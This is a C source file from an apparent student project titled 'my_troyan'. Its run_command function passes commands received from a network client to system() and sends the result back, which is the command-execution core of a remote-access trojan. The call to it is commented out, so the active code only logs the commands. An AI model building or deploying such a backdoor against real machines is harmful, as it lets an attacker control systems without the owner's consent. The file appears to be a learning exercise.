/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 18/04/2021 process_command.c
*/

#include "app.h"
#include <errno.h>

static int run_command(const char *command, socket_t *client)
{
    int pipe_fd[2];
    //int std_out = dup(1);

    if (pipe(pipe_fd) == -1) {
        return EXIT_FAILURE;
    }
    dup2(pipe_fd[1], 1);
    //dup2(2, server->client.fd);
    if (system(command) != EXIT_SUCCESS) {
        if (socket_send(client, strerror(errno)))
            return EXIT_FAILURE;
    }
    dup2(pipe_fd[0], client->fd);
    if (socket_send(client, "Success\n"))
        return EXIT_FAILURE;
    return EXIT_SUCCESS;
}

int process_command(const char *command, socket_t *client)
{
    write_in_log("Exec: ");
    write_in_log(command);
    write_in_log("\n");
//    if (run_command(command, client))
//        return EXIT_FAILURE;
    return EXIT_SUCCESS;
}